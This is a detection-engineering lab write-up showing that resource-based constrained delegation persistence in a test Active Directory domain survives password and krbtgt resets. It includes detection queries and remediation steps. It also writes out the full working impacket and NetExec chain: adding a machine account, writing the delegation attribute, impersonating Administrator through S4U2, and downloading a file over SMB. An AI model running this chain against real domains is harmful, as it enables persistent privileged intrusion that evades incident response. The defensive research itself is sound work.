#  Resource-Scoped Persistence Survives Credential-Centric AD Remediation
## Resource-Based Constrained Delegation as a Post-IR Persistence Mechanism

**Date:** 2026-05-20
**Platform:** Windows Server 2019 DC (WIN-JOCP945SK51) / Windows Server 2022 Target (WIN-ATTACK)
**Domain:** lab2019.local
**Attacker:** Kali Linux — impacket 0.13.0, nxc (NetExec)

> This is a detection engineering document. The focus is on what survives a credential-centric Active Directory remediation cycle, why it survives, and what explicit remediation looks like. Offensive mechanics beyond what is necessary to document the finding are intentionally omitted.

---

## Research Question

Does resource-based constrained delegation configured on a computer object survive a standard credential-centric incident response remediation cycle, and can an attacker maintain operational access using only their own unrotated credentials post-IR?

---

## Threat Model

Assumed breach. Attacker has obtained Domain Admin. The technique does not require DA to persist — any principal with write access to the target computer object's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute is sufficient. DA is used here to simplify the lab setup.

The IR cycle modeled is credential-centric: it focuses on who has access rather than what grants access. This models a common credential-centric remediation pattern observed in Active Directory incident response — reset compromised accounts, double-reset krbtgt to invalidate Golden Tickets, disable and re-enable affected machine accounts. It does not include enumeration of delegation state on computer objects.

This gap emerges from how most credential-focused remediation workflows prioritize credential rotation over authorization-state review. Delegation attributes on computer objects are not part of standard IR playbooks. They are not audited by default. The telemetry to detect writes exists but is not operationalized.

---

## Environment

| Host | IP | OS | Role |
|---|---|---|---|
| Kali | 192.168.1.x | Debian 13 | Attacker |
| WIN-JOCP945SK51 | 192.168.1.251 | Server 2019 | DC / KDC |
| WIN-ATTACK | 192.168.1.84 | Server 2022 | Target (delegate-to) |

---

## Attack Chain

### Phase 1 — Baseline

Confirm `msDS-AllowedToActOnBehalfOfOtherIdentity` is empty on WIN-ATTACK$ before any modification.

```bash
impacket-rbcd lab2019.local/Administrator:'[redacted]' -dc-ip 192.168.1.251 -action read -delegate-to 'WIN-ATTACK$' -use-ldaps
```

```
[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
```

<img width="1697" height="242" alt="baseline" src="https://github.com/user-attachments/assets/033f5c64-cf49-4062-a885-2568c55f7ac4" />


Clean environment confirmed.

---

### Phase 2 — Persistence Written

Create a machine account under attacker control, then write the RBCD attribute on the target computer object. The domain now trusts RBCDATTACKER$ to impersonate any user to WIN-ATTACK via S4U2Proxy.

```bash
impacket-addcomputer lab2019.local/Administrator:'[redacted]' -dc-ip 192.168.1.251 -computer-name 'RBCDATTACKER$' -computer-pass 'Passw0rd123!' -method LDAPS
```

```
[*] Successfully added machine account RBCDATTACKER$ with password Passw0rd123!.
```

<img width="1701" height="98" alt="rbcdatackemachineaccountcreated" src="https://github.com/user-attachments/assets/d9feb80c-dc8e-4783-864c-b42d36188188" />


```bash
impacket-rbcd lab2019.local/Administrator:'[redacted]' -dc-ip 192.168.1.251 -action write -delegate-from 'RBCDATTACKER$' -delegate-to 'WIN-ATTACK$' -use-ldaps
```

```
[*] Delegation rights modified successfully!
[*] RBCDATTACKER$ can now impersonate users on WIN-ATTACK$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     RBCDATTACKER$   (S-1-5-21-3984567624-304424726-3877085034-2102)
```

<img width="1813" height="204" alt="RBCDATTRIBUTEWRITTEN" src="https://github.com/user-attachments/assets/dc88131a-a9d0-4016-9d70-0f5a460ea452" />


Read-back confirms the attribute is set with the expected SID.

<img width="1478" height="130" alt="REDBACKRBCDATTRIBUTE" src="https://github.com/user-attachments/assets/14a69ac2-ee9c-48b9-99ef-293b9514c055" />


Both SIDs match across write and read operations. Pre-IR state is locked in.

<img width="1748" height="280" alt="attributewrittenandreadSID" src="https://github.com/user-attachments/assets/c4134196-e27e-4960-834a-0b7ce49ac4c4" />


---

### Phase 3 — IR Simulation

Credential-centric remediation. Administrator password reset and krbtgt double reset to invalidate forged Kerberos tickets. No enumeration of delegation attributes on computer objects was performed.

```powershell
Set-ADAccountPassword -Identity Administrator -NewPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force) -Reset
Set-ADAccountPassword -Identity krbtgt -NewPassword (ConvertTo-SecureString 'KrbtgtPass1!' -AsPlainText -Force) -Reset
Set-ADAccountPassword -Identity krbtgt -NewPassword (ConvertTo-SecureString 'KrbtgtPass2!' -AsPlainText -Force) -Reset
```

No output. All three resets succeeded.

<img width="1482" height="93" alt="IR" src="https://github.com/user-attachments/assets/9bd2a15f-8953-4327-8023-fc82e7b52790" />


`msDS-AllowedToActOnBehalfOfOtherIdentity` on WIN-ATTACK$ was never examined. RBCDATTACKER$ credentials were never rotated. The machine account was never disabled or removed. Because the account was attacker-created but not identified during remediation, it remained a valid Kerberos principal after credential rotation activities completed.

The krbtgt resets invalidate forged Kerberos tickets derived from prior krbtgt material. They do not modify delegation metadata stored on computer objects in Active Directory. Because RBCD authorization is evaluated dynamically by the KDC from the target computer object's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute, the delegation relationship remains valid unless explicitly removed. The KDC is not malfunctioning — it is honoring the authorization state that AD presents to it.

The persistence mechanism survives because the trust relationship is stored on the resource object itself rather than derived from the compromised credentials that IR rotated. Rotating credentials does not alter the authorization state encoded in the directory.

---

### Phase 4 — Persistence Confirmed

Read the attribute back using the new post-IR Administrator credentials.

```bash
impacket-rbcd lab2019.local/Administrator:'NewPass123!' -dc-ip 192.168.1.251 -action read -delegate-to 'WIN-ATTACK$' -use-ldaps
```

```
[*] Accounts allowed to act on behalf of other identity:
[*]     RBCDATTACKER$   (S-1-5-21-3984567624-304424726-3877085034-2102)
```

<img width="1478" height="124" alt="persistence" src="https://github.com/user-attachments/assets/506aaed6-f8ed-4e6c-bf66-1ffe2fa00d85" />


Identical SID. The IR cycle — including krbtgt double reset — touched no resource-scoped delegation attributes.

---

### Phase 5 — Operational Validation

Using only RBCDATTACKER$ credentials. No DA. No rotated credentials.

```bash
impacket-getST lab2019.local/RBCDATTACKER$:'Passw0rd123!' -dc-ip 192.168.1.251 -spn cifs/WIN-ATTACK.lab2019.local -impersonate Administrator
```

```
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_WIN-ATTACK.lab2019.local@LAB2019.LOCAL.ccache
```

<img width="1478" height="204" alt="succeededwitunrotatedcreds" src="https://github.com/user-attachments/assets/36ae74cd-ae4d-49a1-9e26-028f0371fa23" />


The KDC successfully issued the S4U2self and S4U2proxy service tickets requested by the attacker-controlled machine account. The KDC honored the impersonation request because the delegation state was never remediated.

The Kerberos service ticket was consumed via nxc using `--use-kcache`. No credentials passed at authentication time — the ccache derived from RBCDATTACKER$ credentials was sufficient.

```bash
export KRB5CCNAME=Administrator@cifs_WIN-ATTACK.lab2019.local@LAB2019.LOCAL.ccache
nxc smb WIN-ATTACK.lab2019.local -u Administrator -k --use-kcache --get-file 'Windows\System32\drivers\etc\hosts' /tmp/hosts_exfil
```

```
[+] lab2019.local\Administrator from ccache (Pwn3d!)
[+] File "Windows\System32\drivers\etc\hosts" was downloaded to "/tmp/hosts_exfil"
```

<img width="1729" height="822" alt="File Exfilvianxc" src="https://github.com/user-attachments/assets/1354c30b-903c-43e5-9922-5fc477cafad6" />


Administrative SMB access to the target system was successfully obtained post-remediation. No credentials entered post-IR. No rotated credential touched. No previously compromised privileged credential was required post-remediation — the attacker authenticated exclusively with the pre-positioned machine account created before IR.

**Note on Server 2025:** The S4U2 chain was validated against a Server 2022 target. On Server 2025, ticket issuance is confirmed at the KDC layer — S4U2self and S4U2proxy succeed identically. Shell consumption via impacket's SMB layer is blocked by Server 2025 Kerberos negotiation strictness; this is a tooling limitation, not a finding limitation. The delegation primitive is identical regardless of execution surface. What the attacker does with the issued ticket — whether consumed via impacket on Server 2022, Rubeus on a domain-joined foothold, or another execution path — is an implementation detail. The trust relationship in AD was never remediated.

---

### Phase 6 — Explicit Remediation

What IR would need to do but sometimes doesn't:

```powershell
Set-ADComputer WIN-ATTACK -Clear msDS-AllowedToActOnBehalfOfOtherIdentity
```

<img width="1286" height="177" alt="completeremediation" src="https://github.com/user-attachments/assets/bd1957e9-df73-42e5-94e1-37eaf74339b9" />


Attribute confirmed empty.

```bash
impacket-rbcd lab2019.local/Administrator:'NewPass123!' -dc-ip 192.168.1.251 -action read -delegate-to 'WIN-ATTACK$' -use-ldaps
```

```
[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
```

<img width="1481" height="80" alt="confirmrbcdattributeiscleanpostremediation" src="https://github.com/user-attachments/assets/194f3157-1560-4c38-ae5f-ec59f4b86a64" />


S4U2 chain now fails at the KDC layer:

```bash
impacket-getST lab2019.local/RBCDATTACKER$:'Passw0rd123!' -dc-ip 192.168.1.251 -spn cifs/WIN-ATTACK.lab2019.local -impersonate Administrator
```

```
[-] Kerberos SessionError: KDC_ERR_BADOPTION(KDC cannot accommodate requested option)
[-] Probably SPN is not allowed to delegate by user RBCDATTACKER$ or initial TGT not forwardable
```

<img width="1401" height="186" alt="failurepostfullremediation" src="https://github.com/user-attachments/assets/87e224f5-9190-4e19-9019-ebf51607c18c" />


`KDC_ERR_BADOPTION`. The delegation state is gone. The chain is dead.

---

## The Finding

Credential-centric IR remediation — including krbtgt double reset — does not remove resource-based constrained delegation persistence. The attacker's machine account credentials were never rotated. The delegation attribute was never audited. The KDC continued honoring impersonation requests post-IR.

> IR focused on principals. The attacker owned a resource attribute.
> Those are different trust surfaces.

Password resets remediate credential exposure. They do not remediate delegation-state persistence. These are different trust surfaces, and most IR playbooks treat only one of them.

---

## Detection

### EID 5136 — Directory Service Object Modification

Write to `msDS-AllowedToActOnBehalfOfOtherIdentity` on a computer object generates EID 5136. This is the primary detection point.

**Requirement:** SACL pre-configured on computer objects auditing writes to `msDS-AllowedToActOnBehalfOfOtherIdentity`. Not present by default. Not wired to alert by default.

The telemetry exists. The operationalization does not.

**Hunting query:**
```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=5136} |
Where-Object { $_.Message -match 'msDS-AllowedToActOnBehalfOfOtherIdentity' }
```

### EID 4769 — Kerberos Service Ticket Request

S4U2self and S4U2proxy generate EID 4769 entries. High volume, low signal without correlation to delegation state and principal behavior.

---

## Remediation

Post-IR validation must include explicit enumeration of `msDS-AllowedToActOnBehalfOfOtherIdentity` across all computer objects. This is not a standard step in documented IR playbooks.

**LDAP query:**
```powershell
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_.'msDS-AllowedToActOnBehalfOfOtherIdentity' -ne $null } |
Select-Object Name, 'msDS-AllowedToActOnBehalfOfOtherIdentity'
```

**BloodHound:** re-ingest post-IR and review delegation edges.

Neither is commonly included in credential-focused remediation workflows. Both materially improve visibility into delegation persistence.

---

## MITRE ATT&CK

| Technique | ID |
|---|---|
| Resource-Based Constrained Delegation | T1134.001 |
| Account Manipulation | T1098 |
| Valid Accounts: Domain Accounts | T1078.002 |
| Steal or Forge Kerberos Tickets | T1558 |

---

## Detection Telemetry — Lab Validation

Both detection signals were confirmed in ELK (Winlogbeat 8.19.14 → Kibana) during the lab run.

### EID 5136 — Attribute Write Confirmed

Three `msDS-AllowedToActOnBehalfOfOtherIdentity` modification events were captured on `CN=WIN-ATTACK,CN=Computers,DC=lab2019,DC=local`:

| Timestamp | Operation | Subject |
|---|---|---|
| 2026-05-20 17:49 | Value Added | Administrator |
| 2026-05-20 18:27 | Value Deleted | Administrator |
| 2026-05-20 20:33 | Value Added | Administrator |

The attribute value is logged as "Malformed Security Descriptor" — expected behaviour. Windows event logging cannot render the binary ACL blob as a readable SID. The attribute name and operation type are the detection signal, not the value field.

<img width="1918" height="682" alt="5136" src="https://github.com/user-attachments/assets/282aa070-8e2c-4d4d-a286-521c5a26d86a" />


### EID 4769 — S4U2Proxy Chain Confirmed

Multiple EID 4769 events were generated during each `impacket-getST` invocation. The S4U2proxy fingerprint is visible in the `Transited Services` field:

```
Account Name:     RBCDATTACKER$@LAB2019.LOCAL
Service Name:     WIN-ATTACK$
Ticket Options:   0x40830000
Transited Services: RBCDATTACKER$@LAB2019.LOCAL
```

`Ticket Options: 0x40830000` indicates S4U2proxy. `Transited Services` populated with the delegating account is the chain identifier — it distinguishes S4U2proxy requests from standard service ticket requests where this field is empty.

EID 4769 alone is high volume. Without correlation to EID 5136 and awareness that RBCDATTACKER$ is an attacker-created account, these events are indistinguishable from normal Kerberos service ticket traffic. The detection anchor is EID 5136 on write. EID 4769 with a populated `Transited Services` field is the confirmation signal.

<img width="1611" height="261" alt="4769" src="https://github.com/user-attachments/assets/14ab9dd4-d6c9-4c95-b717-2b509407927d" />


**KQL — S4U2proxy activity:**

```kql
event.code: 4769 AND winlog.event_data.TransmittedServices: *
```

Combined with EID 5136 on the same object within a reasonable time window, this constitutes a high-fidelity detection opportunity — provided the SACL is pre-configured.




## Tools Used

| Tool | Purpose |
|---|---|
| impacket-addcomputer | Machine account creation |
| impacket-rbcd | RBCD attribute write/read |
| impacket-getST | S4U2 ticket chain |
| nxc (NetExec) | SMB authentication and file access via kcache |

---

*Lab environment. All credentials redacted. Do not use against systems you do not own or have explicit written permission to test.*
